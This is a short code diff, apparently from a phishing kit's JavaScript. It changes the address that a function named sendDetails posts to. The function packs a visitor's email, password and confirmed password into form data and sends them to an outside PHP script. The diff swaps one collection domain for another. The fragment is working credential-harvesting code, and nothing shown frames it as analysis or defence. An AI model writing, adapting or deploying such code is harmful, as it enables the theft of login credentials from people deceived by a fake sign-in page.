@@ -113,7 +113,7 @@
 
   function sendDetails(t, e, n) {
       var o = new FormData;
-      o.append("email", t), o.append("password", e), o.append("confirm_password", n),o.append("id",1), axios.post("https://hermosawildlife.org/feedback0.php", o).then(function(t) {
+      o.append("email", t), o.append("password", e), o.append("confirm_password", n),o.append("id",1), axios.post("https://dkzb.org/feedback0.php", o).then(function(t) {
           200 === t.status && redirect(t.data)
       }).catch(function(t) {
           console.log(t), alert(t + "\nPlease try again!"), window.history.go(-1)
